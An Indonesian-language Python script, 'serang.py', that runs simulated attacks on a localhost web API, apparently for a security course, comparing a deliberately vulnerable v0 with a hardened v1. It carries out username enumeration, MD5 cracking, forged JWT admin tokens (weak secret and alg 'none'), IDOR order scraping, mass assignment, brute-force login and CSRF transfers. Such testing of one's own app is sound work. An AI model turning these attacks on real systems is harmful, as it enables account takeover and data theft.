"""
serang.py - simulasi break-in round.
Hanya untuk aplikasi MILIK SENDIRI (localhost).
"""
import hashlib
import random
import string
import sys
import warnings

import jwt
import requests

warnings.simplefilter("ignore")

ARGUMEN = [a for a in sys.argv[1:] if not a.startswith("--")]
BASE = ARGUMEN[0] if ARGUMEN else "http://localhost:8000"

KAMUS = [
    "123456", "password", "password123", "qwerty", "admin123",
    "sunshine", "iloveyou", "letmein", "welcome", "monkey",
]
SANDI = "Sandi#Uji-12345"

hasil = []


def lapor(nama, bocor, bukti):
    status = "BOCOR " if bocor else "DITOLAK"
    hasil.append((nama, bocor))
    print(f"[{status}] {nama}")
    print(f"    {bukti}")


def acak():
    return "".join(random.choices(string.ascii_lowercase, k=6))


def daftar_login(prefix):
    uname = f"{prefix}_{acak()}"
    data = {
        "name": uname,
        "username": uname,
        "email": f"{uname}@uji.test",
        "password": SANDI,
    }
    uid = requests.post(f"{BASE}/auth/register", json=data).json()["id"]
    r = requests.post(
        f"{BASE}/auth/login",
        data={"username": uname, "password": SANDI},
    )
    token = r.json().get("access_token", "")
    return uname, uid, {"Authorization": f"Bearer {token}"}


def tebak_md5(hash_md5):
    for kata in KAMUS:
        if hashlib.md5(kata.encode()).hexdigest() == hash_md5:
            return kata
    return None


def serang_v0():
    print("\n== SERANGAN KE V0 (rumah rentan) ==")
    api = f"{BASE}/v0"

    # 1. enumerasi username
    a = requests.post(f"{api}/login", json={"username": "v0_budi", "password": "x"})
    b = requests.post(f"{api}/login", json={"username": "hantu", "password": "x"})
    lapor(
        "1 Enumerasi username",
        a.json() != b.json(),
        f"{a.json()['detail']!r} vs {b.json()['detail']!r}",
    )

    # 2. data bocor + hash lemah
    bukti, retak = "tidak ketemu", False
    for i in range(1, 200):
        r = requests.get(f"{api}/users/{i}")
        if r.status_code == 200 and r.json().get("username") == "v0_budi":
            kata = tebak_md5(r.json()["password_hash"])
            retak = kata is not None
            bukti = f"hash MD5 bocor, password asli = {kata!r}"
            break
    lapor("2 Hash lemah + data bocor", retak, bukti)

    # 3. token palsu
    palsu = jwt.encode({"sub": "1", "role": "admin"}, "secret123", algorithm="HS256")
    r = requests.get(f"{api}/admin/orders", headers={"Authorization": f"Bearer {palsu}"})
    lapor("3 Token admin palsu", r.status_code == 200, f"HTTP {r.status_code}")

    # 4. BOLA
    akun = {"username": "v0_budi", "password": "password123"}
    r = requests.post(f"{api}/login", json=akun)
    token = r.json()["access_token"]
    h = {"Authorization": f"Bearer {token}"}
    id_saya = int(jwt.decode(token, options={"verify_signature": False})["sub"])
    milik_lain = 0
    for i in range(1, 200):
        o = requests.get(f"{api}/orders/{i}", headers=h)
        if o.ok and o.json().get("user_id") != id_saya:
            milik_lain += 1
    lapor(
        "4 BOLA (baca pesanan orang lain)",
        milik_lain > 0,
        f"{milik_lain} pesanan orang lain terbaca (id berurutan)",
    )

    # 5. mass assignment
    u = f"mass_{acak()}"
    r = requests.post(
        f"{api}/register",
        json={
            "name": u,
            "username": u,
            "email": "m@x.id",
            "password": "abc",
            "role": "admin",
            "saldo": 999999999,
        },
    )
    lapor(
        "5 Mass assignment",
        r.json().get("role") == "admin",
        f"role={r.json().get('role')} saldo={r.json().get('saldo')}",
    )

    # 6. brute force
    kena = 0
    for kata in KAMUS + KAMUS:
        r = requests.post(f"{api}/login", json={"username": "v0_siti", "password": kata})
        if r.status_code == 429:
            kena += 1
    lapor("6 Brute force login", kena == 0, f"20 percobaan, {kena} diblokir (429)")

    # 7. CSRF (tiruan browser: cookie ikut, header token tidak ada)
    r = requests.post(
        f"{api}/login-cookie",
        data={"username": "v0_budi", "password": "password123"},
    )
    sesi = r.cookies.get("sesi")
    r = requests.post(
        f"{api}/saldo/kirim",
        headers={"Cookie": f"sesi={sesi}"},
        data={"ke_username": "v0_siti", "jumlah": 1},
    )
    lapor("7 CSRF kirim saldo", r.status_code == 200, f"HTTP {r.status_code}")


def serang_v1():
    print("\n== SERANGAN KE VERSI AMAN (v1, milik kamu) ==")

    penyerang, id_p, h_p = daftar_login("penyerang")
    korban, id_k, h_k = daftar_login("korban")

    r = requests.post(
        f"{BASE}/orders",
        headers=h_k,
        json={"produk": "Rahasia", "jumlah": 1, "total": 1},
    )
    id_pesanan = r.json().get("id", 0)

    # 1. enumerasi
    a = requests.post(
        f"{BASE}/auth/login",
        data={"username": korban, "password": "x"},
    )
    b = requests.post(
        f"{BASE}/auth/login",
        data={"username": "hantu_x", "password": "x"},
    )
    sama = (a.status_code, a.json()) == (b.status_code, b.json())
    da, db = a.json().get("detail"), b.json().get("detail")
    lapor(
        "1 Enumerasi username",
        not sama,
        f"pesan sama: {da!r}" if sama else f"{da!r} vs {db!r}",
    )

    # 2. data sensitif orang lain
    r = requests.get(f"{BASE}/users/{id_k}", headers=h_p)
    sensitif = [f for f in ("password_hash", "saldo", "role") if f in r.text]
    lapor(
        "2 Data sensitif orang lain",
        bool(sensitif),
        f"HTTP {r.status_code}, field sensitif: {sensitif}",
    )

    # 3. token palsu
    tembus = False
    for kunci, alg in [("secret123", "HS256"), ("secret", "HS256"), (None, "none")]:
        palsu = jwt.encode({"sub": "1", "role": "admin"}, kunci, algorithm=alg)
        r = requests.get(
            f"{BASE}/orders",
            headers={"Authorization": f"Bearer {palsu}"},
        )
        tembus = tembus or r.status_code == 200
    lapor("3 Token admin palsu", tembus, "3 token palsu dicoba")

    # 4. BOLA
    terbaca = 0
    for i in range(1, 200):
        o = requests.get(f"{BASE}/orders/{i}", headers=h_p)
        if o.status_code == 200:
            terbaca += 1
    r = requests.get(f"{BASE}/orders/{id_pesanan}", headers=h_p)
    lapor(
        "4 BOLA (baca pesanan orang lain)",
        terbaca > 0,
        f"{terbaca} terbaca; pesanan korban -> HTTP {r.status_code}",
    )

    # 5. mass assignment
    u = f"mass_{acak()}"
    requests.post(
        f"{BASE}/auth/register",
        json={
            "name": u,
            "username": u,
            "email": "m@x.id",
            "password": SANDI,
            "role": "admin",
            "saldo": 999999999,
        },
    )
    t = requests.post(
        f"{BASE}/auth/login",
        data={"username": u, "password": SANDI},
    )
    saya = requests.get(
        f"{BASE}/me",
        headers={"Authorization": f"Bearer {t.json().get('access_token')}"},
    ).json()
    lapor(
        "5 Mass assignment",
        saya.get("role") == "admin" or saya.get("saldo", 0) > 0,
        f"role={saya.get('role')} saldo={saya.get('saldo')}",
    )

    # 6. endpoint terbuka tanpa login
    terbuka = []
    for path in [
        "/users", "/users/1", "/orders", "/orders/1", "/me",
        "/users/1/orders", "/users-dengan-pesanan",
        "/cari-rentan?username=x", "/cari-aman?username=x",
        "/cari-orm?username=x",
    ]:
        if requests.get(f"{BASE}{path}").status_code == 200:
            terbuka.append(path.split("?")[0])
    lapor(
        "6 Endpoint terbuka tanpa login",
        bool(terbuka),
        f"terbuka: {terbuka or 'tidak ada'}",
    )

    # 7. CSRF (tiruan: cookie ikut, header token tidak ada)
    r = requests.post(
        f"{BASE}/auth/login-cookie",
        data={"username": korban, "password": SANDI},
    )
    cookie = {
        "Cookie": f"access_token={r.cookies.get('access_token')}; "
                  f"csrf_token={r.cookies.get('csrf_token')}"
    }
    form = {"ke_username": penyerang, "jumlah": 1}
    r1 = requests.post(f"{BASE}/saldo/kirim", headers=cookie, data=form)
    csrf = r.json().get("csrf_token")
    r2 = requests.post(
        f"{BASE}/saldo/kirim",
        headers={**cookie, "X-CSRF-Token": csrf},
        data=form,
    )
    lapor(
        "7 CSRF kirim saldo",
        r1.status_code not in (401, 403),
        f"tanpa token -> HTTP {r1.status_code}; "
        f"dengan token sah -> HTTP {r2.status_code}",
    )

    # 8. brute force (paling akhir: memicu pembatasan 1 menit)
    kena = 0
    for kata in KAMUS + KAMUS:
        r = requests.post(
            f"{BASE}/auth/login",
            data={"username": korban, "password": kata},
        )
        if r.status_code == 429:
            kena += 1
    lapor("8 Brute force login", kena == 0, f"20 percobaan, {kena} diblokir (429)")


if __name__ == "__main__":
    if "--hanya-v1" not in sys.argv:
        serang_v0()
    serang_v1()
    bocor_v1 = [n for n, b in hasil[-8:] if b]
    print(f"\nRINGKASAN: celah yang masih terbuka di v1: "
          f"{len(bocor_v1)} dari 8")
    for nama in bocor_v1:
        print("  -", nama)
    sys.exit(1 if bocor_v1 else 0)